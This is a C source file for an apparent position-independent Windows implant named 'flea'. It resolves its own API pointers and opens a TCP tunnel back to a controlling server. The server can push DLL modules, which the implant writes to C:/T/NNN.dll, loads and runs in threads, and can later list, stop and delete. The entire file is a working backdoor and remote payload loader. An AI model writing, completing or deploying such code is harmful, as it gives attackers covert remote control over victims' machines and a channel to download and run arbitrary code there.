#include "kernel/flea.h"
#include "protocol/dispatcher.h"
#include "config.h"
#include <stdio.h>
#include <winsock2.h>
#include <windns.h>
#include <windef.h>
#include <assert.h>

#define MOD_MAX 64
#define TUN_MAX 256

typedef struct _RECV_CONTEXT
{
	DWORD dwHdrOff;
	DWORD dwHdrLeft;
	DWORD dwExtOff;
	DWORD dwExtLeft;
	LPBYTE pExtData;

#pragma pack(push, 1)
	struct {
		BYTE byID;
		union {
			struct msg_insmod insmod;
			struct msg_rmmod rmmod;
		} msg;
	} header;
#pragma pack(pop)
} RECV_CONTEXT, *LPRECV_CONTEXT;

static INT TunnelBind(LPFLEA fl, DWORD dwModIndex, UINT nTunnel);
static INT __TunnelBind(LPFLEA fl, DWORD dwModIndex, DWORD dwToken, UINT nTunnel);
static VOID TunnelClose(LPFLEA fl, DWORD dwIndex);
static INT SockRecv(LPFLEA fl, SOCKET sock, LPVOID pBuffer, DWORD iSize);
static INT SockSend(LPFLEA fl, SOCKET sock, LPVOID pData, DWORD iSize);
static INT SockWaitRecv(LPFLEA fl, SOCKET sock, DWORD dwMillise);
static LPWSTR ConvUtf8ToUtf16(LPFLEA fl, LPCSTR pszStr);
static LPSTR ConvUtf16ToUtf8(LPFLEA fl, LPWSTR pszStr);

static LPVOID RelocateAddress(LPFLEA fl, LPVOID pAddress)
{
#ifdef DEBUG_BUILD
	return pAddress;
#else
	extern int start();
	return (LPBYTE) fl->pBase + ((LPBYTE)pAddress - (LPBYTE)start);
#endif
}

LPWSTR ConvUtf8ToUtf16(LPFLEA fl, LPCSTR pszStr) {
	INT cBuf = fl->api.MultiByteToWideChar(CP_UTF8, 0, pszStr, -1, NULL, 0);
	if (cBuf == 0)
		return NULL;
	LPWSTR buf = fl->api.HeapAlloc(fl->hHeap, 0, cBuf * sizeof(WCHAR));
	if (!buf)
		return NULL;
	if (cBuf != fl->api.MultiByteToWideChar(CP_UTF8, 0, pszStr, -1, buf, cBuf)) {
		fl->api.HeapFree(fl->hHeap, 0, buf);
		return NULL;
	}
	return buf;
}

LPSTR ConvUtf16ToUtf8(LPFLEA fl, LPWSTR pszStr) {
	INT cBuf = fl->api.WideCharToMultiByte(CP_UTF8, 0, pszStr, -1, NULL, 0, NULL, NULL);
	if (cBuf < 1)
		return NULL;
	LPSTR buf = fl->api.HeapAlloc(fl->hHeap, 0, cBuf);
	if (!buf)
		return NULL;
	if (cBuf != fl->api.WideCharToMultiByte(CP_UTF8, 0, pszStr, -1, buf, cBuf, NULL, NULL)) {
		fl->api.HeapFree(fl->hHeap, 0, buf);
		return NULL;
	}
	return buf;
}

static VOID RecvContextInit(LPRECV_CONTEXT context)
{
	context->dwHdrOff = 0;
	context->dwHdrLeft = 1;
	context->dwExtOff = 0;
	context->dwExtLeft = 0;
	context->pExtData = NULL;
}

static LPBYTE RecvContextBuffer(LPFLEA fl, LPRECV_CONTEXT context, LPDWORD pBufferSize)
{
	if (context->dwHdrLeft) {
		*pBufferSize = context->dwHdrLeft;
		return ((LPBYTE)&context->header) + context->dwHdrOff;
	}
	if (context->dwExtLeft) {
		*pBufferSize = context->dwExtLeft;
		return context->pExtData + context->dwExtOff;
	}

	context->dwHdrOff = 0;
	context->dwHdrLeft = 1;
	context->dwExtOff = 0;
	context->dwExtLeft = 0;
	*pBufferSize = context->dwHdrLeft;
	if (context->pExtData) {
		fl->api.HeapFree(fl->hHeap, 0, context->pExtData);
		context->pExtData = NULL;
	}
	return (LPBYTE)&context->header;
}

static int RecvContextReduce(LPFLEA fl, LPRECV_CONTEXT context, DWORD dwSize)
{
	if (context->dwHdrLeft) {
		assert(context->dwHdrLeft >= dwSize);
		context->dwHdrLeft -= dwSize;
		context->dwHdrOff += dwSize;
		if (context->dwHdrLeft == 0) {
			if (context->dwHdrOff == sizeof context->header.byID) {
				switch (context->header.byID) {
					case MSG_SVR_INSMOD:
						context->dwHdrLeft += sizeof context->header.msg.insmod;
						break;
					case MSG_SVR_RMMOD:
						context->dwHdrLeft += sizeof context->header.msg.rmmod;
						break;
					case MSG_SVR_LSMOD:
						return 1;
					default:
						return -1;

				}
			} else {
				switch (context->header.byID) {
					case MSG_SVR_INSMOD:
						if (context->header.msg.insmod.size == 0)
							return -1;
						context->dwExtOff = 0;
						context->dwExtLeft = context->header.msg.insmod.size;
						context->pExtData = fl->api.HeapAlloc(fl->hHeap, 0, context->header.msg.insmod.size);
						if (context->pExtData == NULL)
							return -1;
						break;
					case MSG_SVR_RMMOD:
					case MSG_SVR_LSMOD:
						break;
				}
			}
		}
	}
	else if (context->dwExtLeft) {
		assert(context->dwExtLeft >= dwSize);
		context->dwExtLeft -= dwSize;
		context->dwExtOff += dwSize;
		if (context->dwExtLeft == 0)
			return 1;
	} else {
		return -1; //Duplicated call
	}
	return 0;
}

static INT DataInit(LPFLEA fl)
{
	InitializeWin32Api(&fl->api);

	for (int i = 0; i < MOD_MAX; i++)
		fl->mod.aModule[i].status = MOD_STATUS_NONE;

	fl->mod.nModuleCount = 0;

	for (int i = 0; i < TUN_MAX; i++) {
		fl->tun.aTunnel[i].sock = INVALID_SOCKET;
	}
	fl->tun.nTunnelCount = 0;
	fl->tun.hMutex = fl->api.CreateMutexA(FALSE, FALSE, NULL);

	fl->hHeap = fl->api.HeapCreate(0, 0, 0);
	fl->hLogEvent = fl->api.CreateEvent(NULL, FALSE, FALSE, NULL);


	fl->call.SyncRecv = RelocateAddress(fl, SockRecv);
	fl->call.SyncSend = RelocateAddress(fl, SockSend);
	fl->call.SockWaitRecv = RelocateAddress(fl, SockWaitRecv);
	fl->call.TunnelBind = RelocateAddress(fl, TunnelBind);
	fl->call.TunnelClose = RelocateAddress(fl, TunnelClose);
	fl->call.ConvUtf16ToUtf8 = RelocateAddress(fl, ConvUtf16ToUtf8);
	fl->call.ConvUtf8ToUtf16 = RelocateAddress(fl, ConvUtf8ToUtf16);

	return 0;
}

#if 0
static INT TunnelInit(LPFLEA fl, LPCSTR address, WORD wPort)
{
	if (fl->tun.nTunnelCount)
		return -1;

	PDNS_RECORD pDnsRecord;
	if (fl->api.DnsQuery_A(address, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &pDnsRecord, NULL))
		return -1;

	SOCKADDR_IN ipaddr;

	ipaddr.sin_family = AF_INET;
	ipaddr.sin_port = fl->api.htons(wPort);
	ipaddr.sin_addr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;

	// DnsRecordListFree(pDnsRecord, DnsFreeRecordListDeep);

	fl->tun.addr = ipaddr;

	INT iIndex = __TunnelBind(fl, 0, 0, 0);
	if (iIndex == -1)
		return -1;

	fl->tun.aTunnel[iIndex].iModIndex = -1;
	fl->tun.nTunnelCount = 1;
	return 0;
}
#else

static INT TunnelInit(LPFLEA fl, IN_ADDR inaddr, WORD wPort)
{
	if (fl->tun.nTunnelCount)
		return -1;

	#if 0
	PDNS_RECORD pDnsRecord;
	if (fl->api.DnsQuery_A(address, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &pDnsRecord, NULL))
		return -1;
	// ipaddr.sin_addr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
	#endif

	SOCKADDR_IN ipaddr;

	ipaddr.sin_family = AF_INET;
	ipaddr.sin_port = fl->api.htons(wPort);
	ipaddr.sin_addr = inaddr;


	fl->tun.addr = ipaddr;

	INT iIndex = __TunnelBind(fl, 0, 0, 0);
	if (iIndex == -1)
		return -1;

	fl->tun.aTunnel[iIndex].iModIndex = -1;
	fl->tun.nTunnelCount = 1;
	return 0;
}

#endif

static INT TunnelBind(LPFLEA fl, DWORD dwModIndex, UINT nTunnel)
{
	if (fl->tun.dwToken == 0)
		return -1;
	return __TunnelBind(fl, dwModIndex, fl->tun.dwToken, nTunnel);
}

static INT __TunnelBind(LPFLEA fl, DWORD dwModIndex, DWORD dwToken, UINT nTunnel)
{
	SOCKET sock = 0;
	if (fl->tun.nTunnelCount == TUN_MAX)
		goto fail;
	if (dwToken == 0 && fl->tun.nTunnelCount != 0)
		goto fail;

	sock = fl->api.WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);

	if (SOCKET_ERROR == fl->api.WSAConnect(sock, (LPSOCKADDR)&fl->tun.addr,
			sizeof(fl->tun.addr), NULL, NULL, NULL, NULL))
		goto fail;


	struct msg_hello msg = { .token = dwToken, .tunnel = nTunnel };

	if (SockSend(fl, sock, (LPBYTE)&msg, sizeof msg))
		goto fail;

	struct msg_reply_hello reply;
	if (SockRecv(fl, sock, (LPBYTE)&reply, sizeof reply))
		goto fail;

	
	if (dwToken == 0) {
		if (reply.token == 0)
			goto fail;
		fl->tun.dwToken = reply.token;
	}
	else if (reply.token != 0) {
		goto fail;
	}
	
	INT iIndex;
	fl->api.WaitForSingleObject(fl->tun.hMutex, INFINITE);
	for (iIndex = 0; iIndex < TUN_MAX; iIndex++) {
		if (fl->tun.aTunnel[iIndex].sock == INVALID_SOCKET) {
			fl->tun.aTunnel[iIndex].sock = sock;
			fl->tun.aTunnel[iIndex].iModIndex = dwModIndex;
			fl->tun.nTunnelCount ++;
			fl->api.ReleaseMutex(fl->tun.hMutex);
			return iIndex;
		}
	}
	fl->api.ReleaseMutex(fl->tun.hMutex);
fail:
	if (sock)
		fl->api.closesocket(sock);
	return -1;
}

static INT SockRecv(LPFLEA fl, SOCKET sock, LPVOID pBuffer, DWORD dwSize)
{
	WSABUF buf = { .buf = (char *)pBuffer, .len = dwSize, };
	DWORD dwRecv, dwFlags = MSG_WAITALL;
	
	if (fl->api.WSARecv(sock, &buf, 1, &dwRecv, &dwFlags, NULL, NULL) != 0)
		return -1;
	if (dwRecv < dwSize)
		return -1;
	return 0;
}

static INT SockSend(LPFLEA fl, SOCKET sock, LPVOID pData, DWORD dwSize)
{
	WSABUF buf;
	DWORD dwLeft = dwSize;
	while (dwLeft) {
		DWORD dwSent;
		buf.buf = (char *)pData + (dwSize - dwLeft);
		buf.len = dwLeft;
		if (fl->api.WSASend(sock, &buf, 1, &dwSent, 0, 0, 0))
			return -1;
		dwLeft -= dwSent;
	}
	return 0;
}

static INT SockWaitRecv(LPFLEA fl, SOCKET sock, DWORD dwMillise)
{
	fd_set fdset;
	struct timeval timeout = { 
		.tv_sec = dwMillise / 1000,
		.tv_usec = dwMillise % 1000 * 1000,
	};
	FD_ZERO(&fdset);
	FD_SET(sock,&fdset);
	int ret = fl->api.select(0, &fdset, NULL, NULL, &timeout);
	if (ret <= 0)
		return -1;
	return 0;
}

static VOID TunnelClose(LPFLEA fl, DWORD dwIndex)
{
	fl->api.WaitForSingleObject(fl->tun.hMutex, INFINITE);
	if (fl->tun.aTunnel[dwIndex].sock != INVALID_SOCKET) {
		fl->api.closesocket(fl->tun.aTunnel[dwIndex].sock);
		fl->tun.aTunnel[dwIndex].sock = 0;
		fl->tun.nTunnelCount --;
	}
}

static INT ModGetAvailableIndex(LPFLEA fl)
{
	for (INT i = 0; i < MOD_MAX; i++) {
		if (fl->mod.aModule[i].status == MOD_STATUS_NONE)
			return i;
	}
	return -1;
}

static DWORD WINAPI ModThreadFunc(LPVOID pParam)
{
	MOD_THREAD_PARAM threadParam = *(PMOD_THREAD_PARAM)pParam;
	LPFLEA fl = threadParam.pData;
	fl->api.HeapFree(fl->hHeap, 0, pParam);
	return threadParam.pfnModuleEntry(fl, threadParam.iModIndex);
}

static INT ModInstall_Dll(LPFLEA fl, LPCSTR szName, LPCSTR szFileName, LPINT pRet)
{
	HMODULE hModule = NULL;
	PMOD_THREAD_PARAM pThreadParam = NULL;


	hModule = fl->api.LoadLibraryA(szFileName);
	if (!hModule)
		goto out;

	PFNINITIALIZE_PROC pfnInitialize = (PFNINITIALIZE_PROC)fl->api.GetProcAddress(hModule, STATIC_STR("Initialize"));
	if (!pfnInitialize)
		goto out;

	PFNINTERRUPT_PROC pfnInterrupt = (PFNINTERRUPT_PROC)fl->api.GetProcAddress(hModule, STATIC_STR("Interrupt"));
	if (!pfnInterrupt)
		goto out;

	INT iIndex = ModGetAvailableIndex(fl);
	if (iIndex == -1) {
		goto out;
	}

	pThreadParam = fl->api.HeapAlloc(fl->hHeap, 0, sizeof(MOD_THREAD_PARAM));
	if (!pThreadParam)
		goto out;
	
	pThreadParam->iModIndex = iIndex;
	pThreadParam->pfnModuleEntry = pfnInitialize;
	pThreadParam->pData = fl;

	DWORD dwThreadId;
	HANDLE hThread = fl->api.CreateThread(NULL, 0,	RelocateAddress(fl, ModThreadFunc), pThreadParam, 0, &dwThreadId);
	if (hThread == INVALID_HANDLE_VALUE)
		goto out;
	
	fl->mod.aModule[iIndex].hThread = hThread;
	fl->mod.aModule[iIndex].hModule = hModule;
	fl->mod.aModule[iIndex].pPrivate = NULL;
	fl->mod.aModule[iIndex].pfnStopProc = pfnInterrupt;
	fl->mod.aModule[iIndex].status = MOD_STATUS_ACTIVE;
	fl->api.lstrcpyA(fl->mod.aModule[iIndex].szName, szName);

	fl->mod.nModuleCount ++;

	return 0;
out:
	if (pThreadParam)
		fl->api.HeapFree(fl->hHeap, 0, pThreadParam);

	if (hModule)
		fl->api.FreeLibrary(hModule);

	return -1;
}

static VOID ModUninstall(LPFLEA fl, INT iIndex)
{
	if (fl->mod.aModule[iIndex].status != MOD_STATUS_ACTIVE)
		return;

	fl->mod.aModule[iIndex].pfnStopProc(fl, iIndex);
	int ret = fl->api.WaitForSingleObject(fl->mod.aModule[iIndex].hThread, 3000);
	if (ret == WAIT_TIMEOUT)
		fl->api.TerminateThread(fl->mod.aModule[iIndex].hThread, 0);
	fl->api.CloseHandle(fl->mod.aModule[iIndex].hThread);

	fl->mod.aModule[iIndex].status = MOD_STATUS_NONE;
	fl->mod.nModuleCount --;

	WCHAR wzFileName[PATH_MAX];
	DWORD dwLen = fl->api.GetModuleFileNameW(fl->mod.aModule[iIndex].hModule, wzFileName, sizeof wzFileName);

	fl->api.FreeLibrary(fl->mod.aModule[iIndex].hModule);

	if (dwLen)
		fl->api.DeleteFileW(wzFileName);
}

static INT ModFind(LPFLEA fl, LPCSTR pszName)
{
	for (int i = 0, j = 0; j < fl->mod.nModuleCount; i++) {
		if (fl->mod.aModule[i].status == MOD_STATUS_NONE
				|| fl->api.lstrcmpA(fl->mod.aModule[i].szName, pszName) != 0) {
			j ++;
			continue;
		}
		return i;
	}
	return -1;
}

static INT ProcessMessage(LPFLEA fl, LPRECV_CONTEXT ctx)
{
	SOCKET sock = fl->tun.aTunnel[0].sock;

	if (SockSend(fl, sock, &ctx->header.byID, sizeof ctx->header.byID))
		return -1;

	switch (ctx->header.byID) {
		case MSG_SVR_LSMOD: {
			struct msg_mod_set set = { .count = fl->mod.nModuleCount, };
			if (SockSend(fl, sock, &set, sizeof set))
				return -1;
			for (int i = 0, j = 0; j < fl->mod.nModuleCount; i++)
				if (fl->mod.aModule[i].status == MOD_STATUS_ACTIVE) {
					if (SockSend(fl, sock, fl->mod.aModule[i].szName, sizeof set))
						return -1;
					j++;
				}
			break;
		}
		case MSG_SVR_INSMOD: {
			struct msg_ret_code ret = { .error_code = MSG_EOK };
			INT iIndex = ModFind(fl, ctx->header.msg.insmod.name);;
			if (iIndex != -1) {
				ret.error_code = MSG_EMODINUSE;
				if (SockSend(fl, sock, &ret, sizeof ret))
					return -1;
				return 0;
			}

			iIndex = ModGetAvailableIndex(fl);
			if (iIndex == -1) {
				ret.error_code = MSG_EMAXMOD;
				if (SockSend(fl, sock, &ret, sizeof ret))
					return -1;
				return 0;
			}

			CHAR *szFileName = STATIC_STR("C:/T/000.dll");

			szFileName[5] = 0x30 + iIndex / 100 % 10;
			szFileName[6] = 0x30 + iIndex / 10 % 10;
			szFileName[7] = 0x30 + iIndex / 1 % 10;

			BOOL bWriteOK = TRUE;
			HANDLE hFile = fl->api.CreateFileA(szFileName, GENERIC_WRITE, 0, NULL,
					CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile == INVALID_HANDLE_VALUE)
				bWriteOK = FALSE;
			DWORD dwLeftSize = ctx->header.msg.insmod.size;
			while (dwLeftSize) {
				DWORD dwRealWriteSize = 0; // Ignored ???
				if (bWriteOK && !fl->api.WriteFile(hFile, ctx->pExtData + (ctx->dwExtOff - dwLeftSize),
						dwLeftSize, &dwRealWriteSize, NULL))
					bWriteOK = FALSE;
				
				dwLeftSize -= dwRealWriteSize;
			}
			fl->api.CloseHandle(hFile);

			if (!bWriteOK)
				ret.error_code = MSG_EWRITEF;
			else if (ModInstall_Dll(fl, ctx->header.msg.insmod.name, szFileName, NULL))
				ret.error_code = MSG_ELDLIB;

			if (SockSend(fl, sock, &ret, sizeof ret))
				return -1;

			break;
		}
		case MSG_SVR_RMMOD: {
			struct msg_ret_code ret = { .error_code = MSG_EOK };
			INT iIndex = ModFind(fl, ctx->header.msg.rmmod.name);
			if (iIndex >= 0) {
				ModUninstall(fl, iIndex);
			} else {
				ret.error_code = MSG_ENOMOD;
			}
			if (SockSend(fl, sock, &ret, sizeof ret))
				return -1;
			break;
		}
		case MSG_SVR_SYSINFO: {
			struct msg_sysinfo sysinfo;
			fl->api.lstrcpyA(sysinfo.hostname, STATIC_STR("TEST"));
			if (SockSend(fl, sock, &sysinfo, sizeof sysinfo))
				return -1;
			break;
		}
	}
	return 0;
}

void __chkstk_ms() { }

int RunServer(void *pCodeBase, IN_ADDR inaddr, HMODULE WINAPI (*fnLoadLibraryA)(LPCSTR),
		FARPROC WINAPI (*fnGetProcAddress)(HMODULE, LPCSTR))
{
	FLEA flea;
	flea.pBase = pCodeBase;
	flea.api.LoadLibraryA = fnLoadLibraryA;
	flea.api.GetProcAddress = fnGetProcAddress;

	DataInit(&flea);

	WORD wVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	flea.api.WSAStartup(wVersion, &wsaData);

	if (TunnelInit(&flea, inaddr, CONFIG_SERVER_PORT))
		return 1;

	HANDLE aEvents[MOD_MAX + 1];
	BYTE aModIndexMap[MOD_MAX];

	WSAOVERLAPPED overlapped = { .hEvent = flea.api.CreateEventA(NULL, FALSE, FALSE, NULL) };
	SOCKET sock = flea.tun.aTunnel[0].sock;

	aEvents[0] = overlapped.hEvent;
	aEvents[1] = flea.hLogEvent;;

	RECV_CONTEXT ctx;
	RecvContextInit(&ctx);


	BOOL bNeedRecv = TRUE;
	while (1) {
		DWORD dwFlags = 0;
		DWORD dwBufLen;

		if (bNeedRecv) {
			LPBYTE pBuf = RecvContextBuffer(&flea, &ctx, &dwBufLen);
			WSABUF bufRecv = { .buf = (LPSTR)pBuf, .len = dwBufLen };;
			if (flea.api.WSARecv(sock, &bufRecv, 1, NULL, &dwFlags, &overlapped, NULL)) {
				if (flea.api.GetLastError() != WSA_IO_PENDING)
					return 1;
			}
		}

		for (int i = 0, j = 0; j < flea.mod.nModuleCount; i++) {
			if (flea.mod.aModule[i].status == MOD_STATUS_ACTIVE) {
				aEvents[j + 2] = flea.mod.aModule[i].hThread;
				aModIndexMap[j] = i;
				j++;
			}
		}
		DWORD dwWaitEvent = flea.api.WaitForMultipleObjects(flea.mod.nModuleCount + 2, aEvents, FALSE, INFINITE);
		DWORD dwOffset = (dwWaitEvent - WAIT_OBJECT_0);

		if (dwOffset == 0) {
			DWORD dwRecv = 0;
			flea.api.WSAGetOverlappedResult(sock, &overlapped, &dwRecv, TRUE, &dwFlags);
			bNeedRecv = TRUE;
			if (dwRecv == 0)
				return 1;
			int ret = RecvContextReduce(&flea, &ctx, dwRecv);
			if (ret == -1)
				return 1;
			if (ret == 1) {
				if (ProcessMessage(&flea, &ctx))
					return 1;
			}

		} else if (dwOffset == 1) {
			bNeedRecv = FALSE;
			
		} else {
			INT index = aModIndexMap[dwOffset - 2];
			ModUninstall(&flea, index);
			bNeedRecv = FALSE;
		}
	}
	return 0;
}
